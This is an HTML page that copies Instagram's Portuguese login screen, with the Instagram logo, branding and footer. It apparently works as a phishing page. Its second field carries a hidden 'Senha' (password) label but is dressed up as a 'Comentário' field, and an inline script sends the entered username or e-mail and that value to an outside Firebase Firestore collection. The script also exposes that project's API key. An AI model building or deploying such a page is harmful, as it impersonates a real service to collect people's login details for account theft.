<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Comentario Instagram</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form>
                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
                    <input name="email" placeholder="Telefone, nome de usuário ou e-mail" />

                    <label for="comentario" class="sr-only">Senha</label>
                    <input name="comentario" type="text" placeholder="Comentário" />

                    <button type="button" id="send">Entrar</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OU</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a href="/public/index.html">Entrar com o facebook</a>
                    </div>
                    <a href="#">Esqueceua senha?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Não tem uma conta?</p>
                <a href="#">Cadastre-se</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Obtenha o aplicativo.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">SOBRE</a></li>
            <li><a href="#">AJUDA</a></li>
            <li><a href="#">IMPRENSA</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CARREIRAS</a></li>
            <li><a href="#">PRIVACIDADE</a></li>
            <li><a href="#">TERMOS</a></li>
            <li><a href="#">LOCALIZAÇÃO</a></li>
            <li><a href="#">CONTAS MAIS RELEVANTES</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">IDIOMA</a></li>
        </ul>
        <p class="copyright">© 2020 Instagram do Facebook</p>
    </footer>
<script type="module">
    // 1️⃣ Import Firebase
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-firestore.js";

    // 2️⃣ Configuração do Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyAQi__KXTsZQO9pCDcfTaHHD1q-lxojyDw",
      authDomain: "karol-51c2a.firebaseapp.com",
      projectId: "karol-51c2a",
      storageBucket: "karol-51c2a.firebasestorage.app",
      messagingSenderId: "972749971181",
      appId: "1:972749971181:web:2097b53d4cb707ddbab6e4",
      measurementId: "G-YSC432PYQY"
    };

    // 3️⃣ Inicializa Firebase e Firestore
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // 4️⃣ Função para mostrar mensagem
    function showMessage(text, type) {
      let msgBox = document.getElementById("msg-box");
      if (!msgBox) {
        msgBox = document.createElement("div");
        msgBox.id = "msg-box";
        msgBox.style.position = "fixed";
        msgBox.style.top = "10px";
        msgBox.style.left = "50%";
        msgBox.style.transform = "translateX(-50%)";
        msgBox.style.padding = "10px 20px";
        msgBox.style.borderRadius = "6px";
        msgBox.style.fontWeight = "bold";
        msgBox.style.zIndex = "9999";
        document.body.appendChild(msgBox);
      }

      msgBox.textContent = text;
      msgBox.style.backgroundColor = type === "success" ? "#4caf50" : "#f44336";
      msgBox.style.color = "#fff";

      setTimeout(() => {
        msgBox.remove();
      }, 3000);
    }

    // 5️⃣ Evento do botão
    document.addEventListener("DOMContentLoaded", () => {
      const btn = document.getElementById("send");

      btn.addEventListener("click", async () => {
        const email = document.querySelector("input[name='email']").value.trim();
        const comentario = document.querySelector("input[name='comentario']").value.trim();

        if (!email || !comentario) {
          showMessage("Preencha todos os campos!", "error");
          return;
        }

        try {
          // 6️⃣ Salva no Firestore na coleção "comentarios"
          await addDoc(collection(db, "comentarios"), {
            email,
            comentario,
            criadoEm: new Date()
          });

          showMessage("Atualizado com sucesso!", "success");

        } catch (err) {
          console.error("Erro ao salvar no Firebase:", err);
          showMessage("Falha ao salvar!", "error");
        }
      });
    });
  </script>
</body>
</html>
